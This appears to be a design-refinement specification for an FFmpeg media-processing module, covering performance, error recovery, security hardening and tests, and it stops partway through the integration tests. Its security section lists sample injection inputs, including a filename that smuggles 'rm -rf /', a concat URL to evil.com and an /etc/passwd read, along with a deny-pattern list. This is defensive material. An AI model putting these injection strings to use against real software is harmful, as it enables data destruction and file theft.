# FFmpeg Integration Module - Refinement

**SPARC Phase 4: Refinement**
**Version:** 1.0.0
**Date:** 2025-12-15
**Module:** `integrations/ffmpeg`

---

## 1. Overview

### 1.1 Refinement Goals

This document addresses:
- Performance optimizations for high-throughput media processing
- Edge cases and error handling improvements
- Security hardening for untrusted input
- Resource management under load
- Testing strategies for media operations
- Operational considerations for production deployment

### 1.2 Key Refinement Areas

| Area | Priority | Impact |
|------|----------|--------|
| Memory management | High | Prevents OOM on large files |
| Process isolation | High | Security, stability |
| Concurrency tuning | High | Throughput optimization |
| Error recovery | Medium | Reliability |
| Progress accuracy | Medium | User experience |
| Temp file management | Medium | Disk space |
| Hardware acceleration | Low | Performance boost |

---

## 2. Performance Optimizations

### 2.1 Process Pool

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Process Pool Architecture                         │
└─────────────────────────────────────────────────────────────────────┘

Problem: Spawning FFmpeg processes has ~50-100ms overhead

Solution: Pre-warm process pool for probe operations

┌─────────────────────────────────────────────────────────────────────┐
│                       Process Pool                                   │
│                                                                      │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐            │
│  │ FFprobe       │  │ FFprobe       │  │ FFprobe       │            │
│  │ Process #1    │  │ Process #2    │  │ Process #3    │            │
│  │ (warm)        │  │ (warm)        │  │ (warm)        │            │
│  └───────┬───────┘  └───────┬───────┘  └───────┬───────┘            │
│          │                  │                  │                     │
│          └──────────────────┼──────────────────┘                     │
│                             │                                        │
│                    ┌────────▼────────┐                              │
│                    │   Pool Manager  │                              │
│                    │                 │                              │
│                    │ - checkout()    │                              │
│                    │ - release()     │                              │
│                    │ - healthCheck() │                              │
│                    └─────────────────┘                              │
└─────────────────────────────────────────────────────────────────────┘

Configuration:
┌─────────────────────────────────────────────────────────────────────┐
│ probePoolSize: 3           # Pre-warmed FFprobe processes          │
│ probePoolIdleTimeout: 60000 # Kill idle after 60s                  │
│ probePoolMaxAge: 300000    # Recycle after 5 minutes               │
└─────────────────────────────────────────────────────────────────────┘

Pseudocode:
┌─────────────────────────────────────────────────────────────────────┐
│ CLASS ProbePool:                                                    │
│     available: ChildProcess[] = []                                  │
│     inUse: Set<ChildProcess> = new Set()                           │
│                                                                      │
│     ASYNC FUNCTION checkout() -> ChildProcess:                      │
│         IF available.length > 0:                                    │
│             process = available.pop()                               │
│             IF NOT isHealthy(process):                              │
│                 process.kill()                                      │
│                 process = await spawnNew()                          │
│             inUse.add(process)                                      │
│             RETURN process                                          │
│         ELSE IF inUse.size < maxPoolSize:                          │
│             process = await spawnNew()                              │
│             inUse.add(process)                                      │
│             RETURN process                                          │
│         ELSE:                                                       │
│             // Wait for available process                           │
│             RETURN await waitForAvailable()                         │
│                                                                      │
│     FUNCTION release(process: ChildProcess) -> void:               │
│         inUse.delete(process)                                       │
│         IF available.length < poolSize:                            │
│             available.push(process)                                 │
│         ELSE:                                                       │
│             process.kill()                                          │
└─────────────────────────────────────────────────────────────────────┘
```

### 2.2 Streaming Buffer Optimization

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Buffer Management                                 │
└─────────────────────────────────────────────────────────────────────┘

Problem: Large streams can cause memory spikes

Optimizations:

1. Backpressure Handling:
┌─────────────────────────────────────────────────────────────────────┐
│ FUNCTION pipeWithBackpressure(input, ffmpegStdin):                 │
│     input.on("data", (chunk) => {                                  │
│         IF NOT ffmpegStdin.write(chunk):                           │
│             input.pause()  // Apply backpressure                   │
│     })                                                              │
│                                                                      │
│     ffmpegStdin.on("drain", () => {                                │
│         input.resume()     // Resume when buffer drained           │
│     })                                                              │
└─────────────────────────────────────────────────────────────────────┘

2. Configurable Buffer Sizes:
┌─────────────────────────────────────────────────────────────────────┐
│ streamBufferSize: 64 * 1024       # 64KB chunks (default)          │
│ streamHighWaterMark: 1024 * 1024  # 1MB buffer limit               │
│ stderrBufferLimit: 10 * 1024      # 10KB stderr retention          │
└─────────────────────────────────────────────────────────────────────┘

3. Stderr Truncation:
┌─────────────────────────────────────────────────────────────────────┐
│ # Only keep last N bytes of stderr (progress lines overwrite)      │
│ CLASS RingBuffer:                                                   │
│     buffer: Buffer                                                  │
│     writePos: number = 0                                           │
│                                                                      │
│     FUNCTION write(data: Buffer):                                  │
│         IF data.length > this.buffer.length:                       │
│             data = data.slice(-this.buffer.length)                 │
│         // Circular write...                                        │
└─────────────────────────────────────────────────────────────────────┘
```

### 2.3 Parallel Processing Strategies

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Parallel Processing                               │
└─────────────────────────────────────────────────────────────────────┘

Strategy 1: Segment-based Parallelism (for long videos)
┌─────────────────────────────────────────────────────────────────────┐
│                                                                      │
│  Input Video: [====================================]                │
│               0s                                  60s               │
│                                                                      │
│  Split into segments:                                               │
│  [========] [========] [========] [========]                        │
│   0-15s     15-30s     30-45s     45-60s                           │
│      │         │          │          │                              │
│      ▼         ▼          ▼          ▼                              │
│  ┌──────┐  ┌──────┐   ┌──────┐   ┌──────┐                          │
│  │FFmpeg│  │FFmpeg│   │FFmpeg│   │FFmpeg│                          │
│  │ P1   │  │ P2   │   │ P3   │   │ P4   │                          │
│  └──┬───┘  └──┬───┘   └──┬───┘   └──┬───┘                          │
│     │         │          │          │                               │
│     └────────┬┴──────────┴──────────┘                              │
│              ▼                                                       │
│         [Concatenate]                                               │
│              │                                                       │
│              ▼                                                       │
│         Output Video                                                │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘

Constraints:
- Segments must start at keyframes
- Only works for certain operations (transcode, not trim)
- Overhead: split + concat time
- Use when: video > 5 minutes AND parallel slots available

Strategy 2: Multi-output from Single Input
┌─────────────────────────────────────────────────────────────────────┐
│                                                                      │
│           Input                                                      │
│             │                                                        │
│             ▼                                                        │
│        ┌─────────┐                                                  │
│        │ FFmpeg  │                                                  │
│        │ Single  │                                                  │
│        │ Process │                                                  │
│        └────┬────┘                                                  │
│             │                                                        │
│     ┌───────┼───────┐                                               │
│     │       │       │                                               │
│     ▼       ▼       ▼                                               │
│  1080p    720p    480p                                              │
│  output   output  output                                            │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘

Command:
┌─────────────────────────────────────────────────────────────────────┐
│ ffmpeg -i input.mp4 \                                              │
│   -map 0 -c:v libx264 -s 1920x1080 output_1080p.mp4 \             │
│   -map 0 -c:v libx264 -s 1280x720 output_720p.mp4 \               │
│   -map 0 -c:v libx264 -s 854x480 output_480p.mp4                   │
└─────────────────────────────────────────────────────────────────────┘
```

### 2.4 Hardware Acceleration Detection

```
┌─────────────────────────────────────────────────────────────────────┐
│                Hardware Acceleration Detection                       │
└─────────────────────────────────────────────────────────────────────┘

FUNCTION detectHardwareAcceleration() -> HWAccelInfo:
    available = []

    # Check NVIDIA (NVENC/NVDEC)
    IF checkEncoder("h264_nvenc"):
        available.push({
            type: "cuda",
            encoders: ["h264_nvenc", "hevc_nvenc"],
            decoders: ["h264_cuvid", "hevc_cuvid"]
        })

    # Check Intel QuickSync
    IF checkEncoder("h264_qsv"):
        available.push({
            type: "qsv",
            encoders: ["h264_qsv", "hevc_qsv"],
            decoders: ["h264_qsv", "hevc_qsv"]
        })

    # Check AMD VCE
    IF checkEncoder("h264_amf"):
        available.push({
            type: "amf",
            encoders: ["h264_amf", "hevc_amf"],
            decoders: []
        })

    # Check VAAPI (Linux)
    IF checkEncoder("h264_vaapi"):
        available.push({
            type: "vaapi",
            encoders: ["h264_vaapi", "hevc_vaapi"],
            decoders: ["h264", "hevc"],
            device: "/dev/dri/renderD128"
        })

    RETURN {
        available,
        recommended: selectBest(available)
    }

FUNCTION checkEncoder(encoder: string) -> boolean:
    TRY:
        result = execSync(`ffmpeg -hide_banner -encoders | grep ${encoder}`)
        RETURN result.toString().includes(encoder)
    CATCH:
        RETURN false

Usage in Presets:
┌─────────────────────────────────────────────────────────────────────┐
│ hwAccelPresets = {                                                  │
│     "web-hd-nvenc": {                                              │
│         ...PRESETS["web-hd"],                                       │
│         videoCodec: "h264_nvenc",                                   │
│         options: {                                                  │
│             "preset": "p4",      # NVENC preset                    │
│             "rc": "vbr",                                            │
│             "cq": 23                                                │
│         }                                                           │
│     }                                                               │
│ }                                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 3. Edge Cases and Error Handling

### 3.1 Input Validation Edge Cases

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Input Validation Matrix                           │
└─────────────────────────────────────────────────────────────────────┘

| Edge Case                    | Detection              | Handling          |
|------------------------------|------------------------|-------------------|
| Zero-byte file               | stat() check           | Reject early      |
| Truncated/incomplete file    | Probe fails            | Return error      |
| Corrupted headers            | Probe returns partial  | Try repair mode   |
| Encrypted content            | Probe shows encrypted  | Reject + message  |
| Unsupported codec            | Codec not in list      | Suggest conversion|
| Very long file (>24h)        | Duration check         | Warn, allow       |
| Very short file (<100ms)     | Duration check         | Allow             |
| Non-media file extension     | Probe check            | Reject            |
| Symlink to non-existent      | realpath() check       | Reject            |
| File being written to        | flock() or retry       | Retry 3x or fail  |
| Network path (SMB/NFS)       | Path prefix check      | Adjust timeouts   |
| Special characters in path   | Escape or reject       | Escape properly   |
| Unicode filenames            | Normalize NFC          | Handle properly   |
| Very deep path (>4096)       | Length check           | Reject            |

Validation Flow:
┌─────────────────────────────────────────────────────────────────────┐
│ FUNCTION validateInput(input: InputSpec) -> ValidationResult:      │
│     errors = []                                                     │
│     warnings = []                                                   │
│                                                                      │
│     IF input.type === "file":                                       │
│         # Check file exists                                         │
│         IF NOT exists(input.path):                                  │
│             errors.push(new FileNotFoundError(input.path))          │
│             RETURN { valid: false, errors }                         │
│                                                                      │
│         # Check file size                                           │
│         stat = statSync(input.path)                                 │
│         IF stat.size === 0:                                         │
│             errors.push(new InvalidInputError("Empty file"))        │
│             RETURN { valid: false, errors }                         │
│                                                                      │
│         IF stat.size > MAX_INPUT_SIZE:                              │
│             errors.push(new FileTooLargeError(stat.size))          │
│             RETURN { valid: false, errors }                         │
│                                                                      │
│         # Check path for injection                                  │
│         IF containsPathTraversal(input.path):                       │
│             errors.push(new SecurityError("Path traversal"))        │
│             RETURN { valid: false, errors }                         │
│                                                                      │
│         # Quick probe to validate format                            │
│         TRY:                                                        │
│             probeResult = await quickProbe(input.path)              │
│             IF probeResult.streams.length === 0:                    │
│                 errors.push(new InvalidFormatError("No streams"))   │
│         CATCH probeError:                                           │
│             errors.push(new CorruptedInputError(probeError))       │
│                                                                      │
│     RETURN { valid: errors.length === 0, errors, warnings }        │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.2 Process Failure Recovery

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Process Failure Recovery                          │
└─────────────────────────────────────────────────────────────────────┘

Failure Scenarios and Recovery:

1. FFmpeg Crash (SIGSEGV, SIGBUS):
┌─────────────────────────────────────────────────────────────────────┐
│ Signal         │ Cause                  │ Recovery                 │
├────────────────┼────────────────────────┼──────────────────────────┤
│ SIGSEGV (11)   │ Memory corruption      │ Retry once with          │
│                │ Bug in codec           │ software encoding        │
├────────────────┼────────────────────────┼──────────────────────────┤
│ SIGBUS (7)     │ I/O error              │ Check disk, retry once   │
├────────────────┼────────────────────────┼──────────────────────────┤
│ SIGKILL (9)    │ OOM killer             │ Reduce memory settings   │
└────────────────┴────────────────────────┴──────────────────────────┘

2. Timeout Handling:
┌─────────────────────────────────────────────────────────────────────┐
│ FUNCTION handleTimeout(process, jobId):                             │
│     # Stage 1: Graceful stop                                        │
│     process.stdin.end()  # Stop input                              │
│     await sleep(1000)                                               │
│                                                                      │
│     IF process.alive:                                               │
│         # Stage 2: SIGTERM                                          │
│         process.kill("SIGTERM")                                     │
│         await sleep(5000)                                           │
│                                                                      │
│     IF process.alive:                                               │
│         # Stage 3: SIGKILL (force)                                  │
│         process.kill("SIGKILL")                                     │
│                                                                      │
│     # Cleanup partial output                                        │
│     await cleanupPartialOutput(jobId)                               │
│                                                                      │
│     RETURN new TimeoutError(jobId, elapsedTime)                     │
└─────────────────────────────────────────────────────────────────────┘

3. Partial Output Recovery:
┌─────────────────────────────────────────────────────────────────────┐
│ # For resumable operations (like HLS generation)                    │
│                                                                      │
│ FUNCTION attemptResume(failedJob):                                  │
│     IF failedJob.operation !== "createHLS":                         │
│         RETURN null  # Cannot resume                                │
│                                                                      │
│     # Find last complete segment                                    │
│     segments = listSegments(failedJob.output.path)                  │
│     lastComplete = findLastCompleteSegment(segments)                │
│                                                                      │
│     IF lastComplete:                                                │
│         # Resume from last segment                                  │
│         newJob = cloneJob(failedJob)                                │
│         newJob.input.seekTo = lastComplete.endTime                  │
│         newJob.options.startNumber = lastComplete.index + 1        │
│         RETURN newJob                                               │
│                                                                      │
│     RETURN null                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 Resource Exhaustion Handling

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Resource Exhaustion Scenarios                     │
└─────────────────────────────────────────────────────────────────────┘

1. Memory Pressure Detection:
┌─────────────────────────────────────────────────────────────────────┐
│ CLASS MemoryMonitor:                                                │
│     threshold: number = 0.85  # 85% memory usage                   │
│     checkInterval: number = 5000                                    │
│                                                                      │
│     FUNCTION start():                                               │
│         setInterval(() => {                                         │
│             usage = process.memoryUsage()                           │
│             systemFree = os.freemem() / os.totalmem()              │
│                                                                      │
│             IF systemFree < (1 - threshold):                        │
│                 this.emit("memory-pressure", {                      │
│                     heapUsed: usage.heapUsed,                       │
│                     systemFree                                      │
│                 })                                                   │
│         }, checkInterval)                                           │
│                                                                      │
│ # Response to memory pressure                                       │
│ memoryMonitor.on("memory-pressure", () => {                        │
│     # Pause queue processing                                        │
│     jobManager.pauseQueue()                                         │
│                                                                      │
│     # Log warning                                                   │
│     logger.warn("Memory pressure detected, pausing new jobs")      │
│                                                                      │
│     # Resume when memory recovers                                   │
│     waitForMemoryRecovery().then(() => {                           │
│         jobManager.resumeQueue()                                    │
│     })                                                              │
│ })                                                                  │
└─────────────────────────────────────────────────────────────────────┘

2. Disk Space Monitoring:
┌─────────────────────────────────────────────────────────────────────┐
│ FUNCTION checkDiskSpace(outputPath: string, estimatedSize: number):│
│     df = await getDiskFree(outputPath)                             │
│                                                                      │
│     # Need 2x estimated size for temp files                        │
│     required = estimatedSize * 2                                    │
│                                                                      │
│     IF df.available < required:                                     │
│         throw new DiskSpaceError(                                   │
│             `Need ${formatBytes(required)}, ` +                     │
│             `only ${formatBytes(df.available)} available`          │
│         )                                                           │
│                                                                      │
│     IF df.available < required * 1.5:                              │
│         logger.warn("Low disk space", {                             │
│             required,                                               │
│             available: df.available                                 │
│         })                                                          │
│                                                                      │
│ FUNCTION estimateOutputSize(input: MediaInfo, output: OutputSpec):  │
│     inputBitrate = input.bitrate                                   │
│     outputBitrate = parseBitrate(output.videoBitrate) +            │
│                     parseBitrate(output.audioBitrate)              │
│                                                                      │
│     ratio = outputBitrate / inputBitrate                           │
│     estimated = input.size * ratio                                  │
│                                                                      │
│     # Add 20% safety margin                                        │
│     RETURN estimated * 1.2                                          │
└─────────────────────────────────────────────────────────────────────┘

3. File Descriptor Limits:
┌─────────────────────────────────────────────────────────────────────┐
│ # Check ulimit before processing                                    │
│ FUNCTION checkFileDescriptorLimit():                                │
│     current = process.getMaxListeners()                             │
│     # Each FFmpeg job uses ~10 FDs (stdin, stdout, stderr,         │
│     # input file, output file, temp files)                         │
│     required = maxConcurrent * 10 + 100  # buffer                  │
│                                                                      │
│     IF ulimit -n < required:                                        │
│         logger.warn("Low file descriptor limit", {                  │
│             current: ulimit,                                        │
│             recommended: required                                   │
│         })                                                          │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.4 Corrupted Input Handling

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Corrupted Input Recovery                          │
└─────────────────────────────────────────────────────────────────────┘

Detection:
┌─────────────────────────────────────────────────────────────────────┐
│ FFmpeg stderr patterns indicating corruption:                       │
│                                                                      │
│ - "Invalid data found when processing input"                        │
│ - "moov atom not found"                                             │
│ - "Invalid NAL unit size"                                           │
│ - "Error while decoding"                                            │
│ - "Avi stream corrupted"                                            │
│ - "Failed to read frame"                                            │
└─────────────────────────────────────────────────────────────────────┘

Recovery Strategies:
┌─────────────────────────────────────────────────────────────────────┐
│ FUNCTION handleCorruptedInput(input, error):                        │
│     corruptionType = detectCorruptionType(error.stderr)             │
│                                                                      │
│     SWITCH corruptionType:                                          │
│         CASE "missing_moov":                                        │
│             # Try to reconstruct moov atom                          │
│             RETURN tryUntrunc(input)                                │
│                                                                      │
│         CASE "truncated":                                           │
│             # Process available content                             │
│             RETURN processWithIgnoreErrors(input)                   │
│                                                                      │
│         CASE "bad_frames":                                          │
│             # Skip bad frames                                       │
│             RETURN processWithFrameSkip(input)                      │
│                                                                      │
│         CASE "audio_sync":                                          │
│             # Re-sync audio                                         │
│             RETURN processWithAsyncFix(input)                       │
│                                                                      │
│         DEFAULT:                                                    │
│             # Cannot recover                                        │
│             throw new UnrecoverableCorruptionError(input, error)    │
│                                                                      │
│ FUNCTION processWithIgnoreErrors(input):                            │
│     # Use FFmpeg's error resilience                                 │
│     builder = new FFmpegCommandBuilder()                            │
│         .setGlobalOption("-err_detect", "ignore_err")              │
│         .setGlobalOption("-fflags", "+discardcorrupt")             │
│         .addInput(input)                                            │
│         ...                                                         │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 4. Security Hardening

### 4.1 Command Injection Prevention

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Command Injection Prevention                      │
└─────────────────────────────────────────────────────────────────────┘

Attack Vectors:
┌─────────────────────────────────────────────────────────────────────┐
│ 1. Filename injection:                                              │
│    input: "video.mp4; rm -rf /"                                     │
│                                                                      │
│ 2. Filter injection:                                                │
│    filter: "scale=1920:1080; system('whoami')"                      │
│                                                                      │
│ 3. Protocol exploitation:                                           │
│    input: "concat:http://evil.com/payload"                          │
│                                                                      │
│ 4. Metadata injection:                                              │
│    metadata: "title=test\n-i /etc/passwd"                           │
└─────────────────────────────────────────────────────────────────────┘

Mitigations:
┌─────────────────────────────────────────────────────────────────────┐
│ 1. Never Use Shell:                                                 │
│    # BAD: shell: true allows injection                              │
│    exec(`ffmpeg -i ${input} ${output}`, { shell: true })           │
│                                                                      │
│    # GOOD: spawn with array arguments, no shell                    │
│    spawn("ffmpeg", ["-i", input, output], { shell: false })        │
│                                                                      │
│ 2. Path Sanitization:                                               │
│    FUNCTION sanitizePath(path: string) -> string:                   │
│        # Resolve to absolute path                                   │
│        resolved = path.resolve(path)                                │
│                                                                      │
│        # Check for path traversal                                   │
│        IF resolved.includes(".."):                                  │
│            throw new SecurityError("Path traversal attempt")        │
│                                                                      │
│        # Check against allowed directories                          │
│        IF NOT isWithinAllowedDirs(resolved):                        │
│            throw new SecurityError("Path outside allowed dirs")     │
│                                                                      │
│        RETURN resolved                                              │
│                                                                      │
│ 3. Filter String Validation:                                        │
│    FUNCTION validateFilter(filter: string) -> boolean:              │
│        # Disallow system/exec in filters                            │
│        dangerousPatterns = [                                        │
│            /system\s*\(/i,                                          │
│            /exec\s*\(/i,                                            │
│            /shell\s*\(/i,                                           │
│            /\|/,  # Pipe                                            │
│            /;/,   # Command separator                               │
│            /`/,   # Backtick execution                              │
│            /\$\(/ # Command substitution                            │
│        ]                                                            │
│                                                                      │
│        FOR pattern IN dangerousPatterns:                            │
│            IF filter.match(pattern):                                │
│                throw new SecurityError("Dangerous filter pattern")  │
│                                                                      │
│        RETURN true                                                  │
│                                                                      │
│ 4. Protocol Whitelist:                                              │
│    allowedProtocols = ["file", "pipe"]                              │
│    # Explicitly disable network protocols                           │
│    disabledProtocols = ["http", "https", "ftp", "rtsp", "rtmp"]    │
│                                                                      │
│    globalOptions = [                                                │
│        "-protocol_whitelist", allowedProtocols.join(",")           │
│    ]                                                                │
└─────────────────────────────────────────────────────────────────────┘
```

### 4.2 Resource Limits Enforcement

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Resource Limits Enforcement                       │
└─────────────────────────────────────────────────────────────────────┘

Linux cgroups Integration:
┌─────────────────────────────────────────────────────────────────────┐
│ FUNCTION spawnWithLimits(command, limits):                          │
│     cgroupPath = `/sys/fs/cgroup/ffmpeg-${jobId}`                  │
│                                                                      │
│     # Create cgroup                                                 │
│     mkdirSync(cgroupPath)                                           │
│                                                                      │
│     # Set memory limit                                              │
│     writeFileSync(                                                  │
│         `${cgroupPath}/memory.max`,                                 │
│         String(limits.maxMemoryMB * 1024 * 1024)                   │
│     )                                                               │
│                                                                      │
│     # Set CPU limit (optional)                                      │
│     IF limits.cpuPercent:                                           │
│         writeFileSync(                                              │
│             `${cgroupPath}/cpu.max`,                                │
│             `${limits.cpuPercent * 1000} 100000`                    │
│         )                                                           │
│                                                                      │
│     # Spawn process in cgroup                                       │
│     process = spawn("cgexec", [                                     │
│         "-g", `memory,cpu:ffmpeg-${jobId}`,                        │
│         "ffmpeg", ...command.toArgs()                               │
│     ])                                                              │
│                                                                      │
│     # Cleanup cgroup on exit                                        │
│     process.on("exit", () => {                                      │
│         rmdirSync(cgroupPath)                                       │
│     })                                                              │
│                                                                      │
│     RETURN process                                                  │
└─────────────────────────────────────────────────────────────────────┘

Alternative: Node.js Process Limits (simpler):
┌─────────────────────────────────────────────────────────────────────┐
│ FUNCTION monitorProcessMemory(process, limit):                      │
│     interval = setInterval(async () => {                            │
│         TRY:                                                        │
│             # Read /proc/{pid}/status                               │
│             status = await readFile(`/proc/${process.pid}/status`)  │
│             vmRSS = parseVmRSS(status)                              │
│                                                                      │
│             IF vmRSS > limit:                                       │
│                 logger.warn("Process exceeded memory limit", {      │
│                     pid: process.pid,                               │
│                     usage: vmRSS,                                   │
│                     limit                                           │
│                 })                                                   │
│                 process.kill("SIGKILL")                             │
│                 clearInterval(interval)                             │
│         CATCH:                                                      │
│             # Process already exited                                │
│             clearInterval(interval)                                 │
│     }, 1000)                                                        │
│                                                                      │
│     process.on("exit", () => clearInterval(interval))               │
└─────────────────────────────────────────────────────────────────────┘
```

### 4.3 Temp File Security

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Temp File Security                                │
└─────────────────────────────────────────────────────────────────────┘

Secure Temp Directory:
┌─────────────────────────────────────────────────────────────────────┐
│ FUNCTION createSecureTempDir(jobId: string) -> string:              │
│     baseTempDir = config.tempDir                                    │
│                                                                      │
│     # Use cryptographically random suffix                           │
│     randomSuffix = crypto.randomBytes(16).toString("hex")          │
│     jobTempDir = path.join(baseTempDir, `ffmpeg-${randomSuffix}`)  │
│                                                                      │
│     # Create with restrictive permissions                           │
│     mkdirSync(jobTempDir, { mode: 0o700 })                         │
│                                                                      │
│     # Register for cleanup                                          │
│     registerCleanup(jobId, jobTempDir)                              │
│                                                                      │
│     RETURN jobTempDir                                               │
│                                                                      │
│ # Cleanup tracking                                                  │
│ CLASS TempFileRegistry:                                             │
│     files: Map<string, Set<string>> = new Map()                    │
│                                                                      │
│     FUNCTION register(jobId, path):                                 │
│         IF NOT this.files.has(jobId):                              │
│             this.files.set(jobId, new Set())                        │
│         this.files.get(jobId).add(path)                            │
│                                                                      │
│     ASYNC FUNCTION cleanupJob(jobId):                               │
│         paths = this.files.get(jobId)                               │
│         IF NOT paths:                                               │
│             RETURN                                                  │
│                                                                      │
│         FOR path OF paths:                                          │
│             TRY:                                                    │
│                 await rm(path, { recursive: true, force: true })   │
│             CATCH error:                                            │
│                 logger.error("Temp cleanup failed", { path, error })│
│                                                                      │
│         this.files.delete(jobId)                                    │
│                                                                      │
│     # Cleanup stale temp files on startup                           │
│     ASYNC FUNCTION cleanupStale(maxAge: number):                    │
│         files = await readdir(config.tempDir)                       │
│                                                                      │
│         FOR file OF files:                                          │
│             IF file.startsWith("ffmpeg-"):                          │
│                 stat = await statAsync(path.join(config.tempDir, file))│
│                 age = Date.now() - stat.mtime.getTime()            │
│                                                                      │
│                 IF age > maxAge:                                    │
│                     await rm(path.join(config.tempDir, file), {    │
│                         recursive: true, force: true               │
│                     })                                              │
│                     logger.info("Cleaned up stale temp", { file }) │
└─────────────────────────────────────────────────────────────────────┘
```

### 4.4 Input Size Limits

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Input Size Limits                                 │
└─────────────────────────────────────────────────────────────────────┘

Configuration:
┌─────────────────────────────────────────────────────────────────────┐
│ limits = {                                                          │
│     maxInputSize: 10 * 1024 * 1024 * 1024,  # 10 GB               │
│     maxDuration: 24 * 60 * 60,               # 24 hours            │
│     maxResolution: 7680 * 4320,              # 8K                  │
│     maxFrameRate: 120,                        # 120 fps            │
│     maxBitrate: 100 * 1000 * 1000,           # 100 Mbps           │
│     maxStreams: 10,                           # Video + audio      │
│     maxOutputSize: 50 * 1024 * 1024 * 1024,  # 50 GB              │
│ }                                                                   │
│                                                                      │
│ FUNCTION validateLimits(mediaInfo: MediaInfo):                      │
│     errors = []                                                     │
│                                                                      │
│     IF mediaInfo.size > limits.maxInputSize:                        │
│         errors.push(`Input too large: ${formatBytes(mediaInfo.size)}`)│
│                                                                      │
│     IF mediaInfo.duration > limits.maxDuration:                     │
│         errors.push(`Duration too long: ${formatDuration(mediaInfo.duration)}`)│
│                                                                      │
│     videoStream = mediaInfo.streams.find(s => s.type === "video")  │
│     IF videoStream:                                                 │
│         resolution = videoStream.width * videoStream.height        │
│         IF resolution > limits.maxResolution:                       │
│             errors.push(`Resolution too high: ${videoStream.width}x${videoStream.height}`)│
│                                                                      │
│         IF videoStream.fps > limits.maxFrameRate:                   │
│             errors.push(`Frame rate too high: ${videoStream.fps}`) │
│                                                                      │
│     IF mediaInfo.bitrate > limits.maxBitrate:                       │
│         errors.push(`Bitrate too high: ${formatBitrate(mediaInfo.bitrate)}`)│
│                                                                      │
│     IF errors.length > 0:                                           │
│         throw new InputLimitExceededError(errors)                   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 5. Testing Strategy

### 5.1 Unit Test Categories

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Unit Test Categories                              │
└─────────────────────────────────────────────────────────────────────┘

1. Command Builder Tests:
┌─────────────────────────────────────────────────────────────────────┐
│ describe("FFmpegCommandBuilder", () => {                            │
│     it("builds basic transcode command", () => {                    │
│         command = new FFmpegCommandBuilder()                        │
│             .addInput({ type: "file", path: "/in.mp4" })           │
│             .addOutput({ type: "file", path: "/out.mp4",           │
│                         videoCodec: "libx264" })                    │
│             .build()                                                │
│                                                                      │
│         expect(command.toArgs()).toEqual([                          │
│             "-i", "/in.mp4",                                        │
│             "-c:v", "libx264",                                      │
│             "/out.mp4"                                              │
│         ])                                                          │
│     })                                                              │
│                                                                      │
│     it("escapes special characters in paths", () => {...})          │
│     it("validates required inputs", () => {...})                    │
│     it("applies preset options correctly", () => {...})             │
│     it("builds complex filter graphs", () => {...})                 │
│ })                                                                  │
└─────────────────────────────────────────────────────────────────────┘

2. Job Manager Tests:
┌─────────────────────────────────────────────────────────────────────┐
│ describe("JobManager", () => {                                      │
│     it("queues jobs when at capacity", () => {...})                 │
│     it("processes queue in order", () => {...})                     │
│     it("cancels running jobs", () => {...})                         │
│     it("handles concurrent completions", () => {...})               │
│     it("emits correct metrics", () => {...})                        │
│ })                                                                  │
└─────────────────────────────────────────────────────────────────────┘

3. Progress Tracker Tests:
┌─────────────────────────────────────────────────────────────────────┐
│ describe("ProgressTracker", () => {                                 │
│     it("parses FFmpeg progress line", () => {                       │
│         tracker = new ProgressTracker()                             │
│         progress = tracker.parseLine(                               │
│             "frame=100 fps=30 time=00:00:10.00 speed=2x"           │
│         )                                                           │
│         expect(progress).toEqual({                                  │
│             frame: 100,                                             │
│             fps: 30,                                                │
│             time: 10,                                               │
│             speed: 2                                                │
│         })                                                          │
│     })                                                              │
│                                                                      │
│     it("calculates percentage with known duration", () => {...})    │
│     it("handles malformed progress lines", () => {...})             │
│ })                                                                  │
└─────────────────────────────────────────────────────────────────────┘

4. Error Parser Tests:
┌─────────────────────────────────────────────────────────────────────┐
│ describe("FFmpegErrorParser", () => {                               │
│     it("detects file not found", () => {                            │
│         error = parseFFmpegError(                                   │
│             "input.mp4: No such file or directory"                 │
│         )                                                           │
│         expect(error).toBeInstanceOf(FileNotFoundError)             │
│     })                                                              │
│                                                                      │
│     it("detects codec not found", () => {...})                      │
│     it("detects corrupted input", () => {...})                      │
│     it("detects output write failure", () => {...})                 │
│ })                                                                  │
└─────────────────────────────────────────────────────────────────────┘
```

### 5.2 Integration Test Strategy

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Integration Tests                                 │
└─────────────────────────────────────────────────────────────────────┘

Test Environment:
┌─────────────────────────────────────────────────────────────────────┐
│ # Docker container with FFmpeg                                      │
│ FROM node:20-slim                                                   │
│ RUN apt-get update && apt-get install -y ffmpeg                    │
│                                                                      │
│ # Test fixtures                                                     │
│ COPY fixtures/ /fixtures/                                           │
│   - test-video-10s.mp4   # 10 second test video                    │
│   - test-audio-5s.wav    # 5 second test audio                     │
│   - corrupted.mp4        # Intentionally corrupted                  │
│   - no-audio.mp4         # Video only                               │
│   - no-video.mp4         # Audio only                               │
└─────────────────────────────────────────────────────────────────────┘

Integration Test Cases:
┌─────────────────────────────────────────────────────────────────────┐
│ describe("FFmpeg Integration", () => {                              │
│     beforeAll(async () => {                                         │
│         client = new FFmpegClient({                                 │
│             tempDir: "/tmp/ffmpeg-tests"                            │
│         })                                                          │
│     })                                                              │
│                                                                      │
│     describe("probe", () => {                                       │
│         it("returns correct metadata", async () => {                │
│             info = await client.probe({                             │
│                 type: "file",                                       │
│                 path: "/fixtures/test-video-10s.mp4"                │
│             })                                                      │
│             expect(info.duration).toBeCloseTo(10, 1)                │
│             expect(info.streams).toHaveLength(2)                    │
│         })                                                          │
│     })                                                              │
│                                                                      │
│     describe("transcode", () => {                                   │
│         it("produces valid output", async () => {                   │
